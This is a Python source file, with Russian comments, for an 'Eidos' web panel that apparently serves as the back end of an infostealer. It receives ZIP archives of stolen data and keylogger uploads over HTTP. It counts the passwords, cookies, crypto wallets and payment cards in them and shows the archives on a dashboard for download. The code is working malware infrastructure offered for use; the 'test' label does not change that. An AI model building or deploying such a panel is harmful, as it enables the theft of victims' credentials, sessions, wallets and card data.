# Eidos Test Panel — улучшенная веб-панель
# Запуск: python test_panel.py
# Принимает логи: http://localhost:5000

import http.server
import json, os, time, urllib.parse, io, zipfile
from datetime import datetime

DATA_DIR = "test_logs"
os.makedirs(f"{DATA_DIR}/archives", exist_ok=True)
os.makedirs(f"{DATA_DIR}/keylogs", exist_ok=True)

stats = {"sessions": 0, "passwords": 0, "cookies": 0, "wallets": 0, "cards": 0, "files": 0, "started": datetime.now().isoformat()}

HTML = """<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Eidos Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.header{background:linear-gradient(135deg,#00c6ff,#0072ff);padding:20px 30px;display:flex;align-items:center;justify-content:space-between}
.header h1{color:#fff;font-size:24px;font-weight:700}
.header span{color:rgba(255,255,255,.7);font-size:14px}
.container{max-width:1400px;margin:0 auto;padding:20px}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:30px}
.card{background:#14141f;border-radius:12px;padding:20px;border:1px solid #222}
.card .num{font-size:32px;font-weight:700;color:#00c6ff}
.card .label{font-size:13px;color:#888;margin-top:4px}
.card .badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;margin-top:8px}
.badge-green{background:#00c85322;color:#00c853;border:1px solid #00c85344}
.badge-blue{background:#0072ff22;color:#00c6ff;border:1px solid #0072ff44}
table{width:100%;border-collapse:collapse;background:#14141f;border-radius:12px;overflow:hidden;border:1px solid #222}
th{background:#1a1a2e;padding:12px 16px;text-align:left;font-size:13px;color:#888;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
td{padding:12px 16px;border-top:1px solid #222;font-size:14px}
tr:hover{background:#1a1a2e55}
.file-name{color:#00c6ff;text-decoration:none}
.file-name:hover{text-decoration:underline}
.size{color:#888;font-size:13px}
.time{color:#555;font-size:13px}
.section-title{font-size:18px;font-weight:600;margin:20px 0 12px;color:#fff}
.empty{text-align:center;padding:40px;color:#555}
.tabs{display:flex;gap:8px;margin-bottom:20px}
.tab{padding:8px 20px;border-radius:8px;cursor:pointer;font-size:14px;background:#14141f;border:1px solid #222;color:#888}
.tab.active{background:#0072ff22;border-color:#0072ff;color:#00c6ff}
</style></head>
<body>
<div class="header"><h1>Eidos Panel</h1><span>Test Mode</span></div>
<div class="container" id="app"></div>
<script>
async function load(){let r=await fetch('/api/stats'),d=await r.json()
document.getElementById('app').innerHTML=`
<div class="cards">
<div class="card"><div class="num">${d.sessions}</div><div class="label">Sessions</div></div>
<div class="card"><div class="num">${d.passwords}</div><div class="label">Passwords</div></div>
<div class="card"><div class="num">${d.cookies}</div><div class="label">Cookies</div></div>
<div class="card"><div class="num">${d.wallets}</div><div class="label">Wallets</div></div>
<div class="card"><div class="num">${d.cards}</div><div class="label">Cards</div></div>
<div class="card"><div class="num">${d.archives}</div><div class="label">Archives</div><span class="badge badge-blue">${d.total_archive_size_kb} KB</span></div>
</div>
<div class="section-title">Logs</div>
<table><tr><th>Time</th><th>File</th><th>Size</th></tr>
${d.logs.map(l=>'<tr><td class="time">'+l.time+'</td><td><a class="file-name" href="/download/'+l.name+'">'+l.name+'</a></td><td class="size">'+l.size+'</td></tr>').join('')}
</table>
`
}
load();setInterval(load,5000)
</script></body></html>"""

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _json(self, d, s=200):
        self.send_response(s); self.send_header("Content-Type","application/json"); self.send_header("Access-Control-Allow-Origin","*")
        self.end_headers(); self.wfile.write(json.dumps(d).encode())

    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path == "/api/health":
            self._json({"status":"ok","time":time.time()})
        elif p.path == "/api/stats":
            files = sorted([f for f in os.listdir(f"{DATA_DIR}/archives/") if f.endswith(".zip")], reverse=True)
            total_size = sum(os.path.getsize(f"{DATA_DIR}/archives/{f}") for f in files if os.path.isfile(f"{DATA_DIR}/archives/{f}"))
            logs = []
            for f in files[:50]:
                fp = f"{DATA_DIR}/archives/{f}"
                logs.append({"name":f,"time":f[4:19] if f.startswith("log_") else f[:19],"size":f"{round(os.path.getsize(fp)/1024,1)} KB"})
            self._json({**stats,"total_archive_size_kb":round(total_size/1024,1),"archives":len(files),"logs":logs})
        elif p.path.startswith("/download/"):
            fname = p.path[10:]
            fpath = f"{DATA_DIR}/archives/{fname}"
            if os.path.exists(fpath):
                self.send_response(200)
                self.send_header("Content-Type","application/zip")
                self.send_header("Content-Disposition",f'attachment; filename="{fname}"')
                self.end_headers()
                with open(fpath,"rb") as f: self.wfile.write(f.read())
            else:
                self._json({"error":"not found"},404)
        elif p.path == "/":
            self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8"); self.end_headers()
            self.wfile.write(HTML.encode())
        else:
            self._json({"error":"not found"},404)

    def do_POST(self):
        p = urllib.parse.urlparse(self.path)
        cl = int(self.headers.get("Content-Length",0))
        body = self.rfile.read(cl)
        if p.path == "/api/log":
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"log_{ts}_{stats['sessions']}.zip"
            with open(f"{DATA_DIR}/archives/{fname}","wb") as f: f.write(body)
            stats["sessions"] += 1
            try:
                z = zipfile.ZipFile(io.BytesIO(body))
                for n in z.namelist():
                    if "password" in n.lower() or "login" in n.lower(): stats["passwords"] += 1
                    if "cookies" in n.lower() or "cookie" in n.lower(): stats["cookies"] += 1
                    if "wallet" in n.lower(): stats["wallets"] += 1
                    if "card" in n.lower(): stats["cards"] += 1
                z.close()
            except: pass
            print(f"[LOG] #{stats['sessions']} - {len(body)} bytes -> {fname}")
            self._json({"status":"received","id":stats["sessions"]})
        elif p.path == "/api/log/keylog":
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"keylog_{ts}_{stats['sessions']}.txt"
            with open(f"{DATA_DIR}/keylogs/{fname}","wb") as f: f.write(body)
            print(f"[KEYLOG] #{stats['sessions']} - {len(body)} bytes")
            self._json({"status":"received"})
        elif p.path in ("/api/log/chunk","/api/log/complete"):
            self._json({"status":"ok"})
        else:
            self._json({"error":"not found"},404)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","*")
        self.end_headers()

if __name__ == "__main__":
    port = 5000
    print(f"""
+------------------------------------+
|         EIDOS TEST PANEL           |
|  http://localhost:{port}            |
|  POST /api/log - receive logs      |
|  GET  /api/stats - JSON stats      |
|  GET  /download/ - download logs   |
|  Logs: {DATA_DIR}/archives/        |
+------------------------------------+
    """)
    s = http.server.HTTPServer(("0.0.0.0", port), Handler)
    try: s.serve_forever()
    except KeyboardInterrupt: print("\n[STOPPED]"); s.server_close()
